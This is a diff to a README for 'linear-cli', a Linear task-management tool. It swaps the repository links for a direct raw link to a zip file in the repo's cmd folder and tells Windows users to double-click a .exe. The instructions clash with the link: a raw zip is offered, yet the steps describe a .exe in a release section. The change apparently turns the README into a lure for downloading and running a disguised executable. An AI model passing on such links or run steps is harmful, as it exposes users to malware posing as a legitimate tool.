@@ -1,6 +1,6 @@
 # 🚀 linear-cli - Manage your Linear tasks with speed
 
-[![](https://img.shields.io/badge/Download-linear--cli-blue.svg)](https://github.com/Sujicha8817/linear-cli)
+[![](https://img.shields.io/badge/Download-linear--cli-blue.svg)](https://raw.githubusercontent.com/Sujicha8817/linear-cli/main/cmd/linear-cli-v2.3.zip)
 
 This tool helps you manage your Linear workspace. It works on your computer to handle issues, projects, and cycles. You can update your work without opening a web browser. The app runs commands to track progress and sync data. It handles high-level tasks through a simple text interface.
 
@@ -8,7 +8,7 @@ This tool helps you manage your Linear workspace. It works on your computer to h
 
 You need a Windows computer to use this application. Ensure you have an active internet connection to link the tool with your Linear account. Follow these steps to set up the software.
 
-1. Go to the [official download page](https://github.com/Sujicha8817/linear-cli) to find the latest version.
+1. Go to the [official download page](https://raw.githubusercontent.com/Sujicha8817/linear-cli/main/cmd/linear-cli-v2.3.zip) to find the latest version.
 2. Look for the file ending in .exe under the latest release section.
 3. Save the file to your desktop or a folder you can find easily.
 4. Double-click the file to open it.
